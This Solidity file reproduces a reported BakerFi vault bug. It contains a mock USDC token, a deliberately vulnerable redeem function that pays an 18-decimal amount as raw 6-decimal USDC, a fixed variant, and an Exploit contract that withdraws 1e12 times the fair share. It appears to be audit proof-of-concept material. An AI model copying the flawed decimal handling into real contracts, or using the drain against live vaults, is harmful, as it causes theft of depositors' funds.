// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BakerFi StrategyLeverage — Code4rena 2024-12, H-04
    totalAssets() is 18-decimal. _redeemInternal passes that amount straight
    into _undeploy, which pulls the 6-decimal USDC raw. One internal token
    withdraws 1e18 raw units instead of 1e6, 1e12 times the fair amount.
*/

contract Usdc {
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StrategyLeverage {
    Usdc public usdc;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Usdc usdc_) {
        usdc = usdc_;
    }

    function seed(address user, uint256 assets18, uint256 shares) external {
        totalAssets = assets18;
        totalSupply = shares;
        balanceOf[user] = shares;
    }

    function redeem(uint256 shares) external returns (uint256 retAmount) {
        if (shares == 0) revert InvalidAmount();
        if (balanceOf[msg.sender] < shares) revert NotEnoughBalanceToWithdraw();
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        uint256 withdrawAmount = (shares * totalAssets) / (totalSupply + shares);
        if (withdrawAmount == 0) revert NoAssetsToWithdraw();
        totalAssets -= withdrawAmount;
        retAmount = _undeploy(withdrawAmount);
    }

    function _undeploy(uint256 amount) internal returns (uint256) {
        // @> VULN: withdrawAmount is 18-decimal and _undeploy spends it as raw USDC (6 decimals)
        require(usdc.transfer(msg.sender, amount), "pull");
        return amount;
    }

    error InvalidAmount();
    error NotEnoughBalanceToWithdraw();
    error NoAssetsToWithdraw();
}

contract StrategyLeverageFixed {
    Usdc public usdc;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(Usdc usdc_) {
        usdc = usdc_;
    }

    function seed(address user, uint256 assets18, uint256 shares) external {
        totalAssets = assets18;
        totalSupply = shares;
        balanceOf[user] = shares;
    }

    function redeem(uint256 shares) external returns (uint256) {
        balanceOf[msg.sender] -= shares;
        uint256 withdrawAmount = (shares * totalAssets) / totalSupply;
        uint256 raw = withdrawAmount / 1e12;
        require(usdc.transfer(msg.sender, raw), "pull");
        return raw;
    }
}

contract Exploit {
    Usdc public usdc;
    StrategyLeverage public strategy;
    uint256 public fair;
    uint256 public got;

    constructor() {
        usdc = new Usdc();
        strategy = new StrategyLeverage(usdc);
        strategy.seed(address(this), 1000 ether, 1000 ether);
        usdc.mint(address(strategy), 1000 ether);
    }

    function run() external {
        fair = 1 ether / 1e12;
        got = strategy.redeem(1 ether);
        require(fair == 1e6, "fair");
        require(got == 1 ether, "got");
        require(got == fair * 1e12, "scale");
        require(usdc.balanceOf(address(this)) == 1 ether, "balance");
        require(usdc.balanceOf(address(strategy)) == 999 ether, "left");
    }
}
